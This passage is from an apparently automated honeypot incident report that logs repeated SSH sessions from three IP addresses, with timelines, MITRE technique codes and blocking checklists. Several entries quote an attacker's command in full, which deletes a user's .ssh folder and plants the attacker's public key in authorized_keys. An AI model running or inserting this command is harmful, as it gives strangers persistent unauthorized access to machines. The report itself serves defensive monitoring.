| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 14:06:59` | `cowrie.session.connect` |
| `2026-05-27 14:06:59` | `cowrie.client.version` |
| `2026-05-27 14:06:59` | `cowrie.client.kex` |
| `2026-05-27 14:07:00` | `cowrie.login.success` |
| `2026-05-27 14:07:00` | `cowrie.session.params` |
| `2026-05-27 14:07:00` | `cowrie.command.input` |
| `2026-05-27 14:07:00` | `cowrie.command.failed` |
| `2026-05-27 14:07:01` | `cowrie.log.closed` |
| `2026-05-27 14:07:01` | `cowrie.session.params` |
| `2026-05-27 14:07:01` | `cowrie.command.input` |
| `2026-05-27 14:07:01` | `cowrie.session.file_download` |
| `2026-05-27 14:07:01` | `cowrie.log.closed` |
| `2026-05-27 14:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.225.56[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.225.56[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66251b49a118

| Field | Detail |
|---|---|
| **Source IP** | `35.225.56[.]202` |
| **First Seen** | 2026-05-27 14:07 |
| **Last Seen** | 2026-05-27 14:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 14:07:04` | `cowrie.session.connect` |
| `2026-05-27 14:07:04` | `cowrie.client.version` |
| `2026-05-27 14:07:05` | `cowrie.client.kex` |
| `2026-05-27 14:07:06` | `cowrie.login.success` |
| `2026-05-27 14:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.225.56[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.225.56[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d9771628506

| Field | Detail |
|---|---|
| **Source IP** | `35.225.56[.]202` |
| **First Seen** | 2026-05-27 14:08 |
| **Last Seen** | 2026-05-27 14:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 14:08:25` | `cowrie.session.connect` |
| `2026-05-27 14:08:25` | `cowrie.client.version` |
| `2026-05-27 14:08:25` | `cowrie.client.kex` |
| `2026-05-27 14:08:26` | `cowrie.login.success` |
| `2026-05-27 14:08:27` | `cowrie.session.params` |
| `2026-05-27 14:08:27` | `cowrie.command.input` |
| `2026-05-27 14:08:27` | `cowrie.command.failed` |
| `2026-05-27 14:08:27` | `cowrie.log.closed` |
| `2026-05-27 14:08:28` | `cowrie.session.params` |
| `2026-05-27 14:08:28` | `cowrie.command.input` |
| `2026-05-27 14:08:28` | `cowrie.session.file_download` |
| `2026-05-27 14:08:28` | `cowrie.log.closed` |
| `2026-05-27 14:08:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.225.56[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.225.56[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8b440b13cfd

| Field | Detail |
|---|---|
| **Source IP** | `35.225.56[.]202` |
| **First Seen** | 2026-05-27 14:08 |
| **Last Seen** | 2026-05-27 14:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 14:08:31` | `cowrie.session.connect` |
| `2026-05-27 14:08:31` | `cowrie.client.version` |
| `2026-05-27 14:08:31` | `cowrie.client.kex` |
| `2026-05-27 14:08:32` | `cowrie.login.success` |
| `2026-05-27 14:08:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.225.56[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.225.56[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35ba32fb7443

| Field | Detail |
|---|---|
| **Source IP** | `172.174.72[.]225` |
| **First Seen** | 2026-05-27 16:23 |
| **Last Seen** | 2026-05-27 16:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:23:01` | `cowrie.session.connect` |
| `2026-05-27 16:23:01` | `cowrie.client.version` |
| `2026-05-27 16:23:01` | `cowrie.client.kex` |
| `2026-05-27 16:23:02` | `cowrie.login.success` |
| `2026-05-27 16:23:02` | `cowrie.session.params` |
| `2026-05-27 16:23:02` | `cowrie.command.input` |
| `2026-05-27 16:23:02` | `cowrie.command.failed` |
| `2026-05-27 16:23:03` | `cowrie.log.closed` |
| `2026-05-27 16:23:03` | `cowrie.session.params` |
| `2026-05-27 16:23:03` | `cowrie.command.input` |
| `2026-05-27 16:23:03` | `cowrie.session.file_download` |
| `2026-05-27 16:23:03` | `cowrie.log.closed` |
| `2026-05-27 16:23:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.72[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.174.72[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eb61764193f

| Field | Detail |
|---|---|
| **Source IP** | `172.174.72[.]225` |
| **First Seen** | 2026-05-27 16:23 |
| **Last Seen** | 2026-05-27 16:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:23:06` | `cowrie.session.connect` |
| `2026-05-27 16:23:06` | `cowrie.client.version` |
| `2026-05-27 16:23:06` | `cowrie.client.kex` |
| `2026-05-27 16:23:07` | `cowrie.login.success` |
| `2026-05-27 16:23:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.72[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.174.72[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8d3cce21504

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-27 16:23 |
| **Last Seen** | 2026-05-27 16:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:23:48` | `cowrie.session.connect` |
| `2026-05-27 16:23:48` | `cowrie.client.version` |
| `2026-05-27 16:23:48` | `cowrie.client.kex` |
| `2026-05-27 16:23:49` | `cowrie.login.success` |
| `2026-05-27 16:23:49` | `cowrie.session.params` |
| `2026-05-27 16:23:49` | `cowrie.command.input` |
| `2026-05-27 16:23:49` | `cowrie.command.failed` |
| `2026-05-27 16:23:49` | `cowrie.log.closed` |
| `2026-05-27 16:23:50` | `cowrie.session.params` |
| `2026-05-27 16:23:50` | `cowrie.command.input` |
| `2026-05-27 16:23:50` | `cowrie.session.file_download` |
| `2026-05-27 16:23:50` | `cowrie.log.closed` |
| `2026-05-27 16:23:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5484f423f37c

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-27 16:23 |
| **Last Seen** | 2026-05-27 16:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:23:52` | `cowrie.session.connect` |
| `2026-05-27 16:23:52` | `cowrie.client.version` |
| `2026-05-27 16:23:52` | `cowrie.client.kex` |
| `2026-05-27 16:23:53` | `cowrie.login.success` |
| `2026-05-27 16:23:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e8b00378855

| Field | Detail |
|---|---|
| **Source IP** | `172.174.72[.]225` |
| **First Seen** | 2026-05-27 16:24 |
| **Last Seen** | 2026-05-27 16:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:24:32` | `cowrie.session.connect` |
| `2026-05-27 16:24:32` | `cowrie.client.version` |
| `2026-05-27 16:24:32` | `cowrie.client.kex` |
| `2026-05-27 16:24:33` | `cowrie.login.success` |
| `2026-05-27 16:24:34` | `cowrie.session.params` |
| `2026-05-27 16:24:34` | `cowrie.command.input` |
| `2026-05-27 16:24:34` | `cowrie.command.failed` |
| `2026-05-27 16:24:34` | `cowrie.log.closed` |
| `2026-05-27 16:24:34` | `cowrie.session.params` |
| `2026-05-27 16:24:34` | `cowrie.command.input` |
| `2026-05-27 16:24:35` | `cowrie.session.file_download` |
| `2026-05-27 16:24:35` | `cowrie.log.closed` |
| `2026-05-27 16:24:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.72[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.174.72[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53c2c2083b95

| Field | Detail |
|---|---|
| **Source IP** | `172.174.72[.]225` |
| **First Seen** | 2026-05-27 16:24 |
| **Last Seen** | 2026-05-27 16:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:24:38` | `cowrie.session.connect` |
| `2026-05-27 16:24:38` | `cowrie.client.version` |
| `2026-05-27 16:24:38` | `cowrie.client.kex` |
| `2026-05-27 16:24:39` | `cowrie.login.success` |
| `2026-05-27 16:24:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.72[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.174.72[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75b970212350

| Field | Detail |
|---|---|
| **Source IP** | `172.174.72[.]225` |
| **First Seen** | 2026-05-27 16:26 |
| **Last Seen** | 2026-05-27 16:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:26:07` | `cowrie.session.connect` |
| `2026-05-27 16:26:07` | `cowrie.client.version` |
| `2026-05-27 16:26:07` | `cowrie.client.kex` |
| `2026-05-27 16:26:08` | `cowrie.login.success` |
| `2026-05-27 16:26:08` | `cowrie.session.params` |
| `2026-05-27 16:26:08` | `cowrie.command.input` |
| `2026-05-27 16:26:08` | `cowrie.command.failed` |
| `2026-05-27 16:26:09` | `cowrie.log.closed` |
| `2026-05-27 16:26:09` | `cowrie.session.params` |
| `2026-05-27 16:26:09` | `cowrie.command.input` |
| `2026-05-27 16:26:09` | `cowrie.session.file_download` |
| `2026-05-27 16:26:09` | `cowrie.log.closed` |
| `2026-05-27 16:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.72[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.174.72[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8204f9fecb9

| Field | Detail |
|---|---|
| **Source IP** | `172.174.72[.]225` |
| **First Seen** | 2026-05-27 16:26 |
| **Last Seen** | 2026-05-27 16:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:26:12` | `cowrie.session.connect` |
| `2026-05-27 16:26:12` | `cowrie.client.version` |
| `2026-05-27 16:26:12` | `cowrie.client.kex` |
| `2026-05-27 16:26:13` | `cowrie.login.success` |
| `2026-05-27 16:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.72[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.174.72[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34bcf811efda

| Field | Detail |
|---|---|
| **Source IP** | `172.174.72[.]225` |
| **First Seen** | 2026-05-27 16:31 |
| **Last Seen** | 2026-05-27 16:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:31:00` | `cowrie.session.connect` |
| `2026-05-27 16:31:00` | `cowrie.client.version` |
| `2026-05-27 16:31:00` | `cowrie.client.kex` |
| `2026-05-27 16:31:01` | `cowrie.login.success` |
| `2026-05-27 16:31:01` | `cowrie.session.params` |
| `2026-05-27 16:31:01` | `cowrie.command.input` |
| `2026-05-27 16:31:01` | `cowrie.command.failed` |
| `2026-05-27 16:31:01` | `cowrie.log.closed` |
| `2026-05-27 16:31:02` | `cowrie.session.params` |
| `2026-05-27 16:31:02` | `cowrie.command.input` |
| `2026-05-27 16:31:02` | `cowrie.session.file_download` |
| `2026-05-27 16:31:02` | `cowrie.log.closed` |
| `2026-05-27 16:31:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.72[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.174.72[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5959c749e5bf

| Field | Detail |
|---|---|
| **Source IP** | `172.174.72[.]225` |
| **First Seen** | 2026-05-27 16:31 |
| **Last Seen** | 2026-05-27 16:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:31:05` | `cowrie.session.connect` |
| `2026-05-27 16:31:05` | `cowrie.client.version` |
| `2026-05-27 16:31:05` | `cowrie.client.kex` |
| `2026-05-27 16:31:06` | `cowrie.login.success` |
| `2026-05-27 16:31:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.72[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.174.72[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba4bc0241b34

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-27 16:31 |
| **Last Seen** | 2026-05-27 16:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:31:55` | `cowrie.session.connect` |
| `2026-05-27 16:31:55` | `cowrie.client.version` |
| `2026-05-27 16:31:56` | `cowrie.client.kex` |
| `2026-05-27 16:31:56` | `cowrie.login.success` |
| `2026-05-27 16:31:56` | `cowrie.session.params` |
| `2026-05-27 16:31:56` | `cowrie.command.input` |
| `2026-05-27 16:31:56` | `cowrie.command.failed` |
| `2026-05-27 16:31:57` | `cowrie.log.closed` |
| `2026-05-27 16:31:57` | `cowrie.session.params` |
| `2026-05-27 16:31:57` | `cowrie.command.input` |
| `2026-05-27 16:31:57` | `cowrie.session.file_download` |
| `2026-05-27 16:31:57` | `cowrie.log.closed` |
| `2026-05-27 16:32:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf70ba5a35b7

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-27 16:31 |
| **Last Seen** | 2026-05-27 16:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:31:59` | `cowrie.session.connect` |
| `2026-05-27 16:31:59` | `cowrie.client.version` |
| `2026-05-27 16:31:59` | `cowrie.client.kex` |
| `2026-05-27 16:32:00` | `cowrie.login.success` |
| `2026-05-27 16:32:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6797fe5ea1f7

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-27 16:33 |
| **Last Seen** | 2026-05-27 16:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:33:30` | `cowrie.session.connect` |
| `2026-05-27 16:33:30` | `cowrie.client.version` |
| `2026-05-27 16:33:30` | `cowrie.client.kex` |
| `2026-05-27 16:33:31` | `cowrie.login.success` |
| `2026-05-27 16:33:31` | `cowrie.session.params` |
| `2026-05-27 16:33:31` | `cowrie.command.input` |
